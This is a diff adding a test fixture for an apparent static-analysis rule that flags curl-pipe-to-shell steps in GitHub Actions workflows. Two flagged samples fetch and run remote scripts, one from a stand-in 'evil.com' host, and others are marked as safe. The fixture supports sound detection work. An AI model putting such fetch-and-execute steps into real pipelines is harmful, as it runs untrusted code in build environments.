@@ -1,0 +1,45 @@
+# CWE-95: curl pipe to bash.
+name: bad1
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+# ruleid: gh-curl-eval
+      - run: curl http://example.com/install.sh | bash
+---
+name: bad2
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+# ruleid: gh-curl-eval
+      - run: curl -s http://evil.com/payload | sh
+---
+name: good1
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+# ok: gh-curl-eval
+      - run: echo "hello"
+---
+name: good2
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+# ok: gh-curl-eval
+      - run: curl http://example.com/file.txt --output file.txt
+---
+# ok: gh-curl-eval
+name: good3
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
